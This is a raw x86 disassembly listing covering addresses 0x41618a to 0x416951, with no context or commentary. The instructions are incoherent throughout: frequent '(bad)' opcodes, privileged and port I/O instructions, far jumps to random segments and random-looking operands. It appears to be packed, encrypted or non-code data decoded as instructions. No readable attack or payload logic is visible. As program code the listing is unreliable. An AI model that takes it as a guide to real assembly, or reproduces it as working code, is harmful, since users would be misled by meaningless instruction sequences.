  41618a:	mov    edx,0x72bcfbb4
  41618f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416190:	bound  edi,QWORD PTR [esi+0x3ede2881]
  416196:	mov    ds:0x332416bf,eax
  41619b:	aas    
  41619c:	xor    DWORD PTR [edx],0xec3bfc12
  4161a2:	cwde   
  4161a3:	arpl   WORD PTR [eax],bx
  4161a5:	out    dx,al
  4161a6:	xor    esp,DWORD PTR [edx]
  4161a8:	cs iret 
  4161aa:	cmp    dl,BYTE PTR [ebx]
  4161ac:	imul   ebp,DWORD PTR [ebx],0xffffffaf
  4161af:	add    ebp,esi
  4161b1:	pop    edx
  4161b2:	sahf   
  4161b3:	shr    BYTE PTR [esp+edi*1-0x514aabab],0x11
  4161bb:	shl    BYTE PTR [edi-0x7d30d9f],cl
  4161c1:	dec    ebp
  4161c2:	or     ebx,ebp
  4161c4:	ja     0x41623f
  4161c6:	fild   DWORD PTR [edx+edi*2+0x5f79f9b4]
  4161cd:	fcom   QWORD PTR [ebp-0x7c1bb286]
  4161d3:	push   ds
  4161d4:	pusha  
  4161d5:	jg     0x416214
  4161d7:	mov    edx,0x64316657
  4161dc:	aaa    
  4161dd:	repz cmova eax,ebx
  4161e1:	mul    edx
  4161e3:	xlat   BYTE PTR ds:[ebx]
  4161e4:	cli    
  4161e5:	div    BYTE PTR [eax+0x2c10beda]
  4161eb:	lds    eax,FWORD PTR [esi+0x438a1378]
  4161f1:	mov    al,0xb2
  4161f3:	mov    bp,WORD PTR [eax]
  4161f6:	mov    dl,0x7
  4161f8:	push   0xd471da54
  4161fd:	pop    edx
  4161fe:	dec    edi
  4161ff:	call   0xe1a3:0xc60f7811
  416206:	or     BYTE PTR [ebx],ah
  416208:	inc    BYTE PTR [ecx-0x1a544e1e]
  41620e:	jp     0x416196
  416210:	lods   al,BYTE PTR ds:[esi]
  416211:	push   edi
  416212:	test   al,0xb5
  416214:	jns    0x4161bf
  416216:	jl     0x416253
  416218:	outs   dx,BYTE PTR ds:[esi]
  416219:	gs ret 0x1bc4
  41621d:	lahf   
  41621e:	or     esp,DWORD PTR [ebp-0xa8b5e37]
  416224:	add    ebp,DWORD PTR [esi+0xb]
  416227:	add    DWORD PTR [edi-0x38],0x74fb7ee
  41622e:	stos   DWORD PTR es:[edi],eax
  41622f:	pop    ebx
  416230:	mov    DWORD PTR [esi],0x31b6ae40
  416236:	mov    al,ds:0xfac1752b
  41623b:	cdq    
  41623c:	add    edx,DWORD PTR [ecx]
  41623e:	adc    BYTE PTR [edx-0x3eeb417e],0x4b
  416245:	test   DWORD PTR cs:[esi],ecx
  416248:	jecxz  0x4161cb
  41624a:	icebp  
  41624b:	outs   dx,BYTE PTR ds:[esi]
  41624c:	pop    esp
  41624d:	inc    ebx
  41624e:	jge    0x416236
  416250:	mov    esi,0xb6c6059c
  416255:	cmp    BYTE PTR [ebp-0x3a],bl
  416258:	dec    esi
  416259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41625a:	jbe    0x4162d2
  41625c:	mov    dh,0xb8
  41625e:	sub    eax,0x56b318da
  416263:	(bad)  
  416264:	pop    ebp
  416265:	cmp    edi,DWORD PTR [ebp-0x44]
  416268:	ror    DWORD PTR [ecx],cl
  41626a:	in     al,0x9f
  41626c:	pop    ecx
  41626d:	or     cl,BYTE PTR [edi-0x1aa65035]
  416273:	call   0x5140348b
  416278:	mov    cl,BYTE PTR [esi+eiz*8-0x176f974d]
  41627f:	aam    0x37
  416281:	jl     0x4162b9
  416283:	mov    ds:0x72773ad2,eax
  416288:	sub    eax,0x9085125d
  41628d:	sbb    di,cx
  416290:	and    al,BYTE PTR [esi]
  416292:	arpl   WORD PTR [edi-0x53],ax
  416295:	pop    ebp
  416296:	rcr    DWORD PTR [edx+0x62b25df8],0x54
  41629d:	xlat   BYTE PTR ds:[ebx]
  41629e:	add    ah,BYTE PTR [edx+0x9]
  4162a1:	in     eax,0x24
  4162a3:	data16 mov bl,0xc5
  4162a6:	push   es
  4162a7:	add    eax,0x3fabbd92
  4162ac:	sub    ebx,DWORD PTR [eax+0x691248e4]
  4162b2:	pop    ss
  4162b3:	popf   
  4162b4:	lea    eax,ds:0x3fcf186a
  4162ba:	hlt    
  4162bb:	jl     0x41627d
  4162bd:	scas   eax,DWORD PTR es:[edi]
  4162be:	adc    al,0x41
  4162c0:	mov    esi,0x1130954b
  4162c5:	mov    eax,ds:0xcc82a55a
  4162ca:	push   es
  4162cb:	mov    ah,0x93
  4162cd:	fwait
  4162ce:	fwait
  4162cf:	loopne 0x4162a3
  4162d1:	cld    
  4162d2:	dec    ebx
  4162d3:	xlat   BYTE PTR ds:[ebx]
  4162d4:	mov    BYTE PTR [edx],ah
  4162d6:	lods   eax,DWORD PTR ds:[esi]
  4162d7:	(bad)  
  4162d8:	js     0x416280
  4162da:	lods   al,BYTE PTR ds:[esi]
  4162db:	or     eax,0xd3ed5736
  4162e0:	push   esi
  4162e1:	adc    ah,ah
  4162e3:	push   es
  4162e4:	add    ecx,0xda0da75a
  4162ea:	push   esp
  4162eb:	cmpxchg DWORD PTR [esp+ebx*8+0x6a212d22],eax
  4162f3:	push   ebx
  4162f4:	and    ebp,0x62a5963f
  4162fa:	sbb    ecx,DWORD PTR [eax-0x5f8a10e]
  416300:	in     al,0x29
  416302:	push   ss
  416303:	mov    eax,ds:0xbd5a607b
  416308:	jbe    0x4162d3
  41630a:	mov    dl,0xa8
  41630c:	mov    ch,0xc5
  41630e:	jne    0x4162f7
  416310:	sbb    BYTE PTR [eax+edi*4-0x2542e6c6],0xba
  416318:	mov    cs,WORD PTR [esp+edi*1-0x35]
  41631c:	(bad)  
  41631d:	imul   DWORD PTR [edx+0x2b9df59c]
  416323:	xchg   ecx,eax
  416324:	nop
  416325:	ss inc ecx
  416327:	in     al,dx
  416328:	(bad)  
  416329:	xlat   BYTE PTR ds:[ebx]
  41632a:	je     0x4163ab
  41632c:	sbb    al,0x1b
  41632e:	sub    cl,dl
  416330:	add    BYTE PTR [ebp-0x5c],dl
  416333:	aaa    
  416334:	pop    ecx
  416335:	xchg   edi,eax
  416336:	daa    
  416337:	xchg   esi,eax
  416338:	adc    edi,DWORD PTR [ecx]
  41633a:	sbb    al,0x46
  41633c:	popf   
  41633d:	out    dx,eax
  41633e:	mov    bl,0x36
  416340:	out    dx,eax
  416341:	(bad)  
  416342:	cmp    bl,BYTE PTR [eax]
  416344:	retf   0xe544
  416347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416348:	cmp    eax,0xb7610ac9
  41634d:	(bad)  
  41634e:	mov    eax,0xdead6c5
  416353:	out    dx,al
  416354:	and    al,dl
  416356:	es dec ebp
  416358:	aad    0xe0
  41635a:	popa   
  41635b:	sbb    esp,DWORD PTR [eax]
  41635d:	cmp    eax,0xa57b900e
  416362:	mov    WORD PTR [esi+eax*1],fs
  416365:	dec    ecx
  416366:	and    ebx,esi
  416368:	stos   DWORD PTR es:[edi],eax
  416369:	in     al,0x37
  41636b:	sbb    eax,0x6789c1
  416370:	fimul  WORD PTR [edi]
  416372:	xchg   edi,eax
  416373:	out    0xf1,eax
  416375:	pop    esi
  416376:	mov    ds:0x4ea7e49,eax
  41637b:	enter  0x7ba6,0x21
  41637f:	or     eax,0x57d3c62
  416384:	jne    0x416306
  416386:	data16 jne 0x41638b
  416389:	jl     0x416394
  41638b:	(bad)  
  41638c:	cs pop edi
  41638e:	bound  ebp,QWORD PTR [edx]
  416390:	push   cs
  416391:	mov    cl,0x79
  416393:	gs and al,0xf7
  416396:	and    dl,BYTE PTR [eax+0x76828fb5]
  41639c:	das    
  41639d:	popa   
  41639e:	mov    ebx,0x95f77459
  4163a3:	or     BYTE PTR [esp+esi*8],ch
  4163a6:	lds    edx,FWORD PTR [edx+eax*8-0x1d822eb4]
  4163ad:	push   eax
  4163ae:	aas    
  4163af:	lahf   
  4163b0:	sar    BYTE PTR [ecx-0xd289e6c],cl
  4163b6:	cmp    al,0x1f
  4163b8:	jno    0x4163e5
  4163ba:	cli    
  4163bb:	mov    ah,0x68
  4163bd:	xchg   ebx,eax
  4163be:	repnz inc ebx
  4163c0:	into   
  4163c1:	ins    DWORD PTR es:[edi],dx
  4163c2:	dec    edi
  4163c3:	popa   
  4163c4:	push   0xd16b91c3
  4163c9:	in     eax,dx
  4163ca:	sahf   
  4163cb:	cwde   
  4163cc:	and    al,0x89
  4163ce:	jne    0x416356
  4163d0:	or     edi,0xffffffbc
  4163d3:	dec    eax
  4163d4:	push   ebx
  4163d5:	imul   ecx,DWORD PTR [eax],0x34cc079f
  4163db:	dec    edi
  4163dc:	add    bh,ch
  4163de:	cli    
  4163df:	jl     0x4163fe
  4163e1:	mov    al,0x59
  4163e3:	xor    BYTE PTR [esi],ch
  4163e5:	xchg   esi,eax
  4163e6:	mov    ebp,0x86b6e6e1
  4163eb:	test   DWORD PTR [edx],ebp
  4163ed:	sbb    al,0x5a
  4163ef:	inc    esi
  4163f0:	iret   
  4163f1:	push   0xffffffcb
  4163f3:	jle    0x41639c
  4163f5:	xor    BYTE PTR [esp+ebx*8+0x3daa6b6d],cl
  4163fc:	mov    edi,0xa735cbd5
  416401:	mov    dl,0xd7
  416403:	aam    0x99
  416405:	mov    esp,0xb857194
  41640a:	mov    ecx,0x8b3ed662
  41640f:	push   ss
  416410:	call   0xe3fbd1b5
  416415:	lods   al,BYTE PTR ds:[esi]
  416416:	fild   QWORD PTR ds:0xc79a0d0f
  41641c:	(bad)  
  41641d:	cld    
  41641e:	repnz pop ebx
  416420:	adc    DWORD PTR [edi+0x31],esi
  416423:	ret    0x3038
  416426:	push   esp
  416427:	fild   DWORD PTR [ebx]
  416429:	push   cs
  41642a:	outs   dx,BYTE PTR ds:[esi]
  41642b:	push   ecx
  41642d:	test   ah,bl
  41642f:	pushw  0xffaa
  416432:	ss inc esp
  416434:	pusha  
  416435:	push   esp
  416436:	add    eax,0xe2d9af2a
  41643b:	inc    edx
  41643c:	mov    cl,BYTE PTR ds:0xf3a52b38
  416442:	mov    ds:0xe4f42931,al
  416447:	data16 mov al,0x39
  41644a:	push   edi
  41644b:	scas   eax,DWORD PTR es:[edi]
  41644c:	mov    WORD PTR [eax],?
  41644e:	das    
  41644f:	pusha  
  416450:	sti    
  416451:	cli    
  416452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416453:	pusha  
  416454:	ret    
  416455:	cdq    
  416456:	imul   ebx,eax,0xc0ecfa01
  41645c:	mov    DWORD PTR es:[eax],ebx
  41645f:	push   edx
  416460:	sti    
  416461:	dec    ecx
  416462:	adc    esp,ebp
  416464:	adc    bh,BYTE PTR [ebx-0xe7aac7e]
  41646a:	lock push 0x55
  41646d:	push   ebp
  41646e:	sub    cl,BYTE PTR [edi-0x6314434d]
  416474:	inc    ebp
  416475:	js     0x41641e
  416477:	and    DWORD PTR [ecx-0x73014626],edi
  41647d:	mov    esi,0xeea0def0
  416482:	xchg   edi,eax
  416483:	mov    ds:0x6b3736f0,al
  416488:	pop    ecx
  416489:	xchg   esp,eax
  41648a:	mov    edi,0x4e0c6022
  41648f:	into   
  416490:	aam    0x49
  416492:	fcmovne st,st(6)
  416494:	push   ebp
  416495:	outs   dx,BYTE PTR ds:[esi]
  416496:	adc    bh,BYTE PTR [ebp+0x15f0204b]
  41649c:	jae    0x416485
  41649e:	dec    eax
  41649f:	cld    
  4164a0:	les    esp,FWORD PTR [edx+0x3d92d545]
  4164a6:	loope  0x4164ed
  4164a8:	push   0x51441224
  4164ad:	cmp    BYTE PTR [edx+0x530f8881],al
  4164b3:	inc    edx
  4164b4:	sbb    dl,dh
  4164b6:	retf   
  4164b7:	mov    edx,0x871a019d
  4164bc:	aad    0x66
  4164be:	inc    ecx
  4164bf:	pop    edx
  4164c0:	test   BYTE PTR [edx+ebx*4+0x0],0x9b
  4164c5:	lock ficomp WORD PTR [edx+0x5fc38560]
  4164cc:	dec    eax
  4164cd:	pop    ebp
  4164ce:	adc    cl,BYTE PTR [esi-0x6bde99da]
  4164d4:	xlat   BYTE PTR ds:[ebx]
  4164d5:	(bad)
  4164d8:	pop    es
  4164d9:	out    dx,al
  4164da:	stos   BYTE PTR es:[edi],al
  4164db:	and    eax,0x16cb4515
  4164e0:	cmp    DWORD PTR [ebx],ebx
  4164e2:	xchg   esi,eax
  4164e3:	or     eax,0xebba812b
  4164e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164e9:	adc    al,0x7f
  4164eb:	mov    al,ds:0x39f663d1
  4164f0:	add    ah,cl
  4164f2:	or     BYTE PTR [ecx-0x38f86641],ch
  4164f8:	(bad)  
  4164f9:	sti    
  4164fa:	and    al,0xe1
  4164fc:	ds or  eax,0xa99fd294
  416502:	aam    0xad
  416504:	rcr    ebp,0xa3
  416507:	sbb    cl,BYTE PTR [edx-0x782985c3]
  41650d:	push   0x6c
  41650f:	lahf   
  416510:	jo     0x41655e
  416512:	lods   eax,DWORD PTR ds:[esi]
  416513:	xchg   ebp,eax
  416514:	stos   BYTE PTR es:[edi],al
  416515:	mov    dl,0x95
  416517:	scas   eax,DWORD PTR es:[edi]
  416518:	and    bh,BYTE PTR [ebp+0x7c]
  41651b:	sbb    BYTE PTR [eax],al
  41651d:	cwde   
  41651e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41651f:	push   ebp
  416520:	mov    dh,0x6b
  416522:	mov    dh,BYTE PTR [edx]
  416524:	out    0xd9,eax
  416526:	xchg   esp,edx
  416528:	sar    BYTE PTR [edi],cl
  41652a:	imul   esp,DWORD PTR [eax+0x46],0xffffff8c
  41652e:	add    ebx,DWORD PTR ds:0x94a6d021
  416534:	clc    
  416535:	mov    cl,bl
  416537:	push   ss
  416538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416539:	mov    al,ds:0x864c72a2
  41653e:	addr16 jmp 0x41657f
  416541:	jbe    0x416552
  416543:	out    dx,eax
  416544:	stos   WORD PTR es:[edi],ax
  416546:	inc    ebx
  416547:	retf   
  416548:	test   al,0x1e
  41654a:	mov    ecx,0xf4f72301
  41654f:	inc    eax
  416550:	mov    edx,0xac103355
  416555:	in     al,0x93
  416557:	mov    gs,WORD PTR gs:[ebp-0xa]
  41655b:	bound  ebx,QWORD PTR [eax]
  41655d:	cmp    al,0x59
  41655f:	and    esp,ebp
  416561:	dec    ebp
  416562:	lods   al,BYTE PTR ds:[esi]
  416563:	jge    0x416511
  416565:	cdq    
  416566:	mov    bh,0xdf
  416568:	or     BYTE PTR [ebx+0x2565a822],bl
  41656e:	scas   eax,DWORD PTR es:[edi]
  41656f:	ret    0xd262
  416572:	out    dx,eax
  416573:	es pop ebp
  416575:	jbe    0x41651a
  416577:	aaa    
  416578:	fdiv   DWORD PTR [edi-0x3948ea92]
  41657e:	and    bh,dh
  416580:	push   eax
  416581:	mov    ecx,0x9e0e7556
  416586:	ins    BYTE PTR es:[edi],dx
  416587:	and    eax,0xa368cea
  41658c:	into   
  41658d:	mov    WORD PTR [edx+0x40],cs
  416590:	loopne 0x416534
  416592:	dec    si
  416594:	ja     0x41651b
  416596:	repz mov ecx,eax
  416599:	mov    dl,0x89
  41659b:	inc    ebp
  41659c:	aas    
  41659d:	sub    bh,cl
  41659f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165a0:	lahf   
  4165a1:	aad    0x31
  4165a3:	sub    BYTE PTR [esi+0x1cfd5a6f],dh
  4165a9:	pushf  
  4165aa:	clc    
  4165ab:	rcr    BYTE PTR [esi*8+0x4653f52a],0xf6
  4165b3:	ja     0x4165eb
  4165b5:	out    dx,al
  4165b6:	scas   al,BYTE PTR es:[edi]
  4165b7:	sub    DWORD PTR [ecx+0x421a25fd],ebx
  4165bd:	out    0x42,eax
  4165bf:	loope  0x4165a5
  4165c1:	int    0x49
  4165c3:	xor    DWORD PTR [esi-0x79],eax
  4165c6:	ror    DWORD PTR [ebx-0xff02ed7],1
  4165cc:	out    0x3c,eax
  4165ce:	out    dx,eax
  4165cf:	cmp    eax,0x15f585aa
  4165d4:	jcxz   0x4165fc
  4165d7:	push   0xffffff98
  4165d9:	jmp    0xd0f0:0xd1876cfb
  4165e0:	dec    ebx
  4165e1:	and    DWORD PTR [ebp-0x7a40e694],0x34
  4165e8:	sbb    al,0x7
  4165ea:	xor    esi,eax
  4165ec:	dec    ebp
  4165ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165ee:	in     al,dx
  4165ef:	gs inc esp
  4165f1:	gs out dx,al
  4165f3:	mov    ?,esp
  4165f5:	mov    dh,0x25
  4165f7:	imul   esi,DWORD PTR [ebp-0x4d],0xffffff86
  4165fb:	out    0xa0,eax
  4165fd:	inc    edi
  4165fe:	ret    0x8f34
  416601:	dec    edx
  416602:	aad    0xd8
  416604:	call   0x37990b31
  416609:	push   ds
  41660a:	les    esp,FWORD PTR [ebx-0x3d]
  41660d:	(bad)  
  41660e:	arpl   cx,dx
  416610:	(bad)  
  416611:	jl     0x416649
  416613:	outs   dx,BYTE PTR ds:[esi]
  416614:	mov    DWORD PTR [edx-0x54be4ba1],0x1ae3a375
  41661e:	jge    0x41666b
  416620:	inc    edx
  416621:	mov    esi,0x45d72f8f
  416626:	ret    0x87fa
  416629:	rol    DWORD PTR [edx+0x18],0xea
  41662d:	int    0xec
  41662f:	inc    edi
  416630:	cld    
  416631:	xchg   edi,eax
  416632:	cmc    
  416633:	jg     0x416668
  416635:	adc    al,0x7
  416637:	fdiv   st(6),st
  416639:	xchg   edx,eax
  41663a:	jmp    0xa5bd:0x226ea3ad
  416641:	mov    dh,0x1c
  416643:	neg    DWORD PTR [ecx+0x58]
  416646:	jmp    0x6a7f12f1
  41664b:	shl    BYTE PTR [esp+edx*8],0x26
  41664f:	sbb    esp,DWORD PTR [eax+esi*8+0x52]
  416653:	aad    0xc3
  416655:	dec    esi
  416656:	arpl   WORD PTR [ecx-0x462a2010],dx
  41665c:	inc    edi
  41665d:	outs   dx,DWORD PTR ds:[esi]
  41665e:	inc    ebp
  41665f:	(bad)  
  416660:	in     al,dx
  416661:	int3   
  416662:	or     al,0xdb
  416664:	jae    0x4165f7
  416666:	out    dx,eax
  416667:	sti    
  416668:	out    0x6d,eax
  41666a:	sbb    ebx,DWORD PTR [edi+0x44]
  41666d:	or     ecx,DWORD PTR [ecx]
  41666f:	into   
  416670:	inc    ecx
  416671:	jecxz  0x416606
  416673:	shl    bl,1
  416675:	xchg   esi,eax
  416676:	sub    al,0xab
  416678:	xchg   ebx,eax
  416679:	inc    edx
  41667a:	ret    0xa77e
  41667d:	pop    ds
  41667e:	nop
  41667f:	jb     0x4166d0
  416681:	push   ebx
  416682:	repz pusha 
  416684:	outs   dx,BYTE PTR ds:[esi]
  416685:	je     0x416706
  416687:	sub    bl,al
  416689:	cs xchg ecx,eax
  41668b:	and    DWORD PTR [eax],ebp
  41668d:	adc    edx,DWORD PTR [esi]
  41668f:	xchg   ebx,eax
  416690:	scas   eax,DWORD PTR es:[edi]
  416691:	and    DWORD PTR [esi],0xffffffa5
  416694:	fld    TBYTE PTR [edi+0x1a]
  416697:	retf   
  416698:	retf   
  416699:	inc    esp
  41669a:	or     edx,eax
  41669c:	sub    eax,0xf1a9026e
  4166a1:	mov    ecx,0x540eae2d
  4166a6:	cmp    eax,0xaf169cde
  4166ab:	mov    al,0x25
  4166ad:	(bad)  
  4166ae:	xor    cl,BYTE PTR [ecx]
  4166b0:	in     eax,0xbd
  4166b2:	sub    eax,0x894a24fd
  4166b7:	pushf  
  4166b8:	sbb    cl,BYTE PTR [ebp+0x4e]
  4166bb:	mov    ch,0x7c
  4166bd:	cmp    BYTE PTR [ecx-0xc994632],dl
  4166c3:	cmp    al,0xad
  4166c5:	aam    0x26
  4166c7:	(bad)  
  4166c8:	push   0x73577f7a
  4166cd:	jae    0x4166f6
  4166cf:	push   ecx
  4166d0:	xlat   BYTE PTR ds:[ebx]
  4166d1:	outs   dx,DWORD PTR ds:[esi]
  4166d2:	mov    ds:0x1d8b69d8,al
  4166d7:	aas    
  4166d8:	push   esp
  4166d9:	popf   
  4166da:	mov    cl,0xc0
  4166dc:	pop    es
  4166dd:	pop    ebp
  4166de:	inc    edx
  4166df:	and    esp,DWORD PTR [ebx]
  4166e1:	int    0x2d
  4166e3:	das    
  4166e4:	mov    DWORD PTR [ecx-0x4867265],ebp
  4166ea:	adc    al,0x8b
  4166ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166ed:	div    BYTE PTR [ecx-0x5d]
  4166f0:	push   esi
  4166f1:	mov    ah,0xbe
  4166f3:	and    DWORD PTR gs:[edx+eax*8],edi
  4166f7:	retf   
  4166f8:	aam    0x39
  4166fa:	mov    ebx,0x1395869c
  4166ff:	add    al,0x81
  416701:	pop    ebp
  416702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416703:	lahf   
  416704:	sar    DWORD PTR [edi-0x219e429a],0x4e
  41670b:	arpl   WORD PTR [edi],sp
  41670d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41670e:	pusha  
  41670f:	xor    al,BYTE PTR ss:[esi+eax*4]
  416713:	add    BYTE PTR [esi],dl
  416715:	add    cl,BYTE PTR [ecx]
  416717:	mov    al,0xad
  416719:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41671b:	jmp    0x985f:0xa80ca0e2
  416722:	mov    bl,0x5b
  416724:	test   eax,0xe99a4cdd
  416729:	fwait
  41672a:	adc    edx,DWORD PTR [esi+0x50]
  41672d:	in     eax,dx
  41672e:	ret    
  41672f:	pop    ebx
  416730:	es fwait
  416732:	xchg   edx,eax
  416733:	pop    ss
  416734:	cs in  eax,dx
  416736:	stos   BYTE PTR es:[edi],al
  416737:	add    BYTE PTR [eax],dh
  416739:	sbb    edx,DWORD PTR [ebp+edx*1+0xc]
  41673d:	sahf   
  41673e:	aad    0x85
  416740:	sub    DWORD PTR [edx+0x16],esi
  416743:	jo     0x4166c7
  416745:	arpl   si,ax
  416747:	test   cl,0x50
  41674a:	push   0x56
  41674c:	dec    ebp
  41674d:	mov    eax,0x17ad9c8
  416752:	enter  0x4de1,0x98
  416756:	sub    ebx,edi
  416758:	mov    ecx,0x56d66086
  41675d:	dec    esi
  41675e:	jns    0x416791
  416760:	icebp  
  416761:	sub    ebp,DWORD PTR [ecx-0x5788c280]
  416767:	inc    eax
  416768:	sub    eax,DWORD PTR [esi+eax*2+0x8]
  41676c:	lahf   
  41676d:	(bad)  
  41676e:	jge    0x4167d1
  416770:	mov    dh,BYTE PTR [eax+0x59]
  416773:	dec    edi
  416774:	arpl   WORD PTR ds:0xdcb29223,cx
  41677a:	or     al,0x4f
  41677c:	add    al,0xc0
  41677e:	mov    ds:0x31c4af46,eax
  416783:	ins    DWORD PTR es:[edi],dx
  416784:	aas    
  416785:	lea    esp,[eax-0x72b302d2]
  41678b:	shr    DWORD PTR [ebp+0x55],1
  41678e:	mov    edi,0xc4404f5d
  416793:	add    al,0x2a
  416795:	lock mov ?,WORD PTR [ecx+0x53]
  416799:	rcl    BYTE PTR [ebx],1
  41679b:	dec    esp
  41679c:	jne    0x416802
  41679e:	fdivr  DWORD PTR [ebp+0x5bc456cf]
  4167a4:	mov    ebx,0x8adbe97d
  4167a9:	add    DWORD PTR [ebx-0x5f],esi
  4167ac:	dec    esi
  4167ad:	pop    eax
  4167ae:	xchg   edi,eax
  4167af:	and    eax,0x5e10939e
  4167b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167b5:	push   0x74
  4167b7:	jecxz  0x4167b2
  4167b9:	aaa    
  4167ba:	ffreep st(2)
  4167bc:	rcl    DWORD PTR [eax+ebx*1],1
  4167bf:	sub    BYTE PTR [eax-0x68175ad6],dl
  4167c5:	xchg   ecx,edi
  4167c7:	ror    BYTE PTR [ecx-0x79],1
  4167ca:	(bad)  
  4167cb:	shr    DWORD PTR [edx+0x1f],cl
  4167ce:	mov    dh,0xc4
  4167d0:	jb     0x41679b
  4167d2:	or     eax,0xbc1a843e
  4167d7:	xor    al,0x1b
  4167d9:	out    0x49,al
  4167db:	mov    ebp,0x640599c6
  4167e0:	loope  0x416815
  4167e2:	fs scas eax,DWORD PTR es:[edi]
  4167e4:	pop    esp
  4167e5:	test   DWORD PTR [ebp-0x6c],eax
  4167e8:	push   cs
  4167e9:	call   0xbbc0:0x4e76
  4167ef:	sub    ebx,edx
  4167f1:	mov    edx,0x3668cca2
  4167f6:	pop    ss
  4167f7:	fist   WORD PTR [eax+0x4c5b85e4]
  4167fd:	pop    ss
  4167fe:	add    BYTE PTR [ebp+eiz*8-0xc4db50f],ah
  416805:	xor    dl,BYTE PTR [ecx-0x3bf9a014]
  41680b:	out    0x2,al
  41680d:	cli    
  41680e:	inc    edx
  41680f:	popa   
  416810:	mov    bh,0x1b
  416812:	adc    eax,0x67fdb23b
  416817:	(bad)
  41681a:	add    eax,ecx
  41681c:	xor    edi,ebx
  41681e:	sahf   
  41681f:	sub    al,0xcf
  416821:	test   BYTE PTR [ecx+0x2d],dh
  416824:	test   eax,0xd6d15568
  416829:	inc    edi
  41682a:	ret    0x4b0b
  41682d:	(bad)  
  41682e:	fsub   DWORD PTR [ebx-0x64468f49]
  416834:	or     eax,esp
  416836:	mov    bh,0xab
  416838:	imul   esp,esp,0xffffffda
  41683b:	scas   al,BYTE PTR es:[edi]
  41683c:	pop    ebp
  41683d:	mov    ah,0x14
  41683f:	jmp    0x700a84bd
  416844:	aad    0xa4
  416846:	sbb    esi,DWORD PTR [eax+0xc6766c9]
  41684c:	cdq    
  41684d:	ins    DWORD PTR es:[edi],dx
  41684e:	jge    0x4167d8
  416850:	fwait
  416851:	sti    
  416852:	xor    BYTE PTR [esi+eax*4-0x2b],dh
  416856:	stos   DWORD PTR es:[edi],eax
  416857:	pop    es
  416858:	ja     0x41681d
  41685a:	stos   DWORD PTR es:[edi],eax
  41685b:	dec    ebx
  41685c:	jl     0x4167df
  41685e:	add    ah,bl
  416860:	enter  0xa14f,0x4f
  416864:	scas   al,BYTE PTR es:[edi]
  416865:	jmp    0x40bb:0x57bb0cad
  41686c:	fldcw  WORD PTR [ecx-0x16d7128e]
  416872:	and    eax,0x6662ecb3
  416877:	(bad)  
  416878:	cmc    
  416879:	out    dx,eax
  41687a:	push   0xffffff9d
  41687c:	mov    BYTE PTR [esi],dl
  41687e:	pop    esi
  41687f:	test   BYTE PTR [ebp-0x1b],dh
  416882:	xor    ah,BYTE PTR [ecx]
  416884:	xchg   edi,eax
  416885:	lea    esp,[eax-0x64]
  416888:	mov    ecx,0x83007108
  41688d:	inc    esi
  41688e:	pop    eax
  41688f:	push   esi
  416890:	rcl    BYTE PTR [ebx+ebx*8-0x34f8f10b],1
  416897:	sbb    al,0x66
  416899:	mov    ah,BYTE PTR ds:0x6c0ac2b5
  41689f:	inc    edi
  4168a0:	outs   dx,BYTE PTR ds:[esi]
  4168a1:	icebp  
  4168a2:	xor    eax,0x41a82c7
  4168a7:	sub    al,0x9
  4168a9:	jns    0x416838
  4168ab:	jno    0x41689a
  4168ad:	or     edi,DWORD PTR [eax]
  4168af:	scas   al,BYTE PTR es:[edi]
  4168b0:	ret    0x658e
  4168b3:	ret    
  4168b4:	xlat   BYTE PTR ds:[ebx]
  4168b5:	jbe    0x416839
  4168b7:	xlat   BYTE PTR ds:[ebx]
  4168b8:	(bad)  
  4168b9:	in     al,dx
  4168ba:	(bad)  
  4168bb:	cmp    ah,BYTE PTR [ebp+0x5f954634]
  4168c1:	in     eax,0x44
  4168c3:	hlt    
  4168c4:	stos   DWORD PTR es:[edi],eax
  4168c5:	xor    ebx,DWORD PTR [edx]
  4168c7:	fdiv   QWORD PTR [edx]
  4168c9:	xor    BYTE PTR [ecx+0x6f322dcb],dh
  4168cf:	sub    bl,BYTE PTR [ecx-0x25deabad]
  4168d5:	dec    ecx
  4168d6:	cmp    esp,ebp
  4168d8:	pusha  
  4168d9:	add    edx,0x3d4bf35e
  4168df:	mov    ch,0x70
  4168e1:	pop    ebx
  4168e2:	cli    
  4168e3:	out    dx,al
  4168e4:	xor    eax,0x41d48a62
  4168e9:	xor    bl,BYTE PTR [edi-0x26d6bec9]
  4168ef:	repnz cmp cl,bl
  4168f2:	popa   
  4168f3:	cmp    BYTE PTR [ecx-0x6bcaf348],ah
  4168f9:	loop   0x41688a
  4168fb:	sbb    BYTE PTR ds:0xc1f49fff,0xd0
  416902:	sbb    BYTE PTR [edi-0x2a],0x1d
  416906:	pop    edi
  416907:	sar    bh,0x70
  41690a:	pop    ecx
  41690b:	sub    BYTE PTR [eax+0x4e57f30b],0x3f
  416912:	clc    
  416913:	jmp    0x416988
  416915:	jp     0x416977
  416917:	jg     0x416970
  416919:	mov    edi,0x2a51cae1
  41691e:	test   BYTE PTR [ebx+0x68],ah
  416921:	mov    edx,0xd8aeb423
  416926:	test   BYTE PTR [esi],ah
  416928:	cmp    al,0x4a
  41692a:	outs   dx,BYTE PTR ds:[esi]
  41692b:	adc    BYTE PTR [ecx+0x1d4eb5ee],0x87
  416932:	stos   BYTE PTR es:[edi],al
  416933:	jnp    0x416909
  416935:	jb     0x41699b
  416937:	sar    BYTE PTR [edx],0x9c
  41693a:	jge    0x41698a
  41693c:	jmp    0xac37f2e4
  416941:	cld    
  416942:	pop    edi
  416943:	push   ecx
  416944:	outs   dx,BYTE PTR ds:[esi]
  416945:	inc    esi
  416946:	in     al,0xba
  416948:	(bad)  
  416949:	in     al,dx
  41694a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41694b:	xchg   esi,eax
  41694c:	sub    al,al
  41694e:	mov    ch,0x76
  416950:	daa    
  416951:	stc    
